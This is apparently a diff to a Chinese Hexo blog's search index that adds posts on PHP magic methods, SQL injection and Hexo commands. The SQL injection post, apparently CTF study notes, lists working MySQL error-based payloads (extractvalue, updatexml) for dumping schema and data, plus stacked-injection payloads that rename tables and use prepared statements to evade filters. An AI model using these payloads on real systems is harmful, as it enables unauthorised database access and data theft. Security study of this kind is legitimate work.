@@ -4,6 +4,45 @@
   
   
   <entry>
+    <title>php魔术方法</title>
+    <link href="/2022/01/18/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
+    <url>/2022/01/18/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<p>1.__construct()，类的构造函数</p><p>2.__destruct()，类的析构函数</p><p>3.__call()，在对象中调用一个不可访问方法时调用</p><p>4.__callStatic()，用静态方式中调用一个不可访问方法时调用</p><p>5.__get()，获得一个类的成员变量时调用</p><p>6.__set()，设置一个类的成员变量时调用</p><p>7.__isset()，当对不可访问属性调用isset()或empty()时调用</p><p>8.__unset()，当对不可访问属性调用unset()时被调用。</p><p>9.__sleep()，执行serialize()时，先会调用这个函数</p><p>10.__wakeup()，执行unserialize()时，先会调用这个函数</p><p>11.__toString()，类被当成字符串时的回应方法</p><p>12.__invoke()，调用函数的方式调用一个对象时的回应方法</p><p>13.__set_state()，调用var_export()导出类时，此静态方法会被调用。</p><p>14.__clone()，当对象复制完成时调用</p><p>15.__autoload()，尝试加载未定义的类</p><p>16.__debugInfo()，打印所需调试信息</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>注入</title>
+    <link href="/2022/01/18/sql%E6%B3%A8%E5%85%A5/"/>
+    <url>/2022/01/18/sql%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<p>sql注入：</p><p>数据库： information_schema<br>表名字：<br>information_schema.schemata 作用：数据库中的所有的 库名<br>information_schema.tables 作用：数据库中的所有的 库名，表名<br>information_schema.culmns 作用：数据库中的所有的 库名，表名，字段名</p><p>报错注入：</p><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p><h2 id="xpath语法错误："><a href="#xpath语法错误：" class="headerlink" title="xpath语法错误："></a>xpath语法错误：</h2><p>1.extractvalue函数：</p><p>pyload：id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p><p>例如：</p><p>id=’and(select extractvalue(1,concat(‘~’,(select database()))))<br>id=’and(select extractvalue(1,concat(0x7e,@@version)))</p><p>针对mysql数据库：</p><p>查数据库名：id=’and(select extractvalue(1,concat(0x7e,(select database()))))<br>爆表名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))<br>爆字段名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”TABLE_NAME”))))<br>爆数据：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</p><p>2.updatexml：</p><p>payload：id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p><p>例如：</p><p>‘and(select updatexml(1,concat(‘~’,(select database())),1))<br>‘and(select updatexml(1,concat(0x7e,@@database),1))<br>同样，针对mysql：</p><p>爆数据库名：’and(select updatexml(1,concat(0x7e,(select database())),0x7e))<br>爆表名：’and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))<br>爆列名：’and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=”TABLE_NAME”)),0x7e))<br>爆数据：’and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</p><h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><ol><li><p>查数据库    1’;show databases;–+</p></li><li><p>查表            1’;show tables;–+</p></li><li><p>查询两个表的字段  1‘ ; show columns from ‘某某某’ ;–+</p><h2 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容:"></a>查询字段内容:</h2><p>一、改表名</p><p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p><ol><li><p>; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50); #</p></li><li><p>;  alter tables words rename to words1; </p></li><li><p>;  alter tables <code>1919810931114514</code> rename to words ;</p></li><li><p>;  alter tables words change flag id varchar(50); #</p><p>二、预编译来绕过</p><p>构造payload：</p><p>‘;sEt @sql = CONCAT(‘se’,’lect * from <code>字段名</code>;’);prEpare stmt from @sql;EXECUTE stmt;#<br>1<br>‘;sEt @sql = CONCAT(‘se’,‘lect * from 字段名;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p></li></ol></li></ol>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>我的第一篇博客</title>
+    <link href="/2022/01/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
+    <url>/2022/01/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    
+    <content type="html"><![CDATA[<p>第一次写博客，就记录一些hexo的常用命令吧！</p><p>hexo s        :  启动本地服务器，用于预览主题。</p><p>hexo new  ：新建文章。</p><p>hexo d       ：自动生成网站静态文件，并部署到设定的仓库。</p><p>hexo clean：清除缓存文件 db.json 和已生成的静态文件public。</p><p>hexo g        ：生成网站静态文件到默认设置的 public 文件夹。</p><p>hexo new page : 新建一个标题为 aboutme 的页面，默认链接地址为 主页地                                            址/aboutme/。</p><p>hexo new draft : 草稿。</p><p>hexo s –draft ：上传草稿。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Hello World</title>
     <link href="/2021/12/28/hello-world/"/>
     <url>/2021/12/28/hello-world/</url>
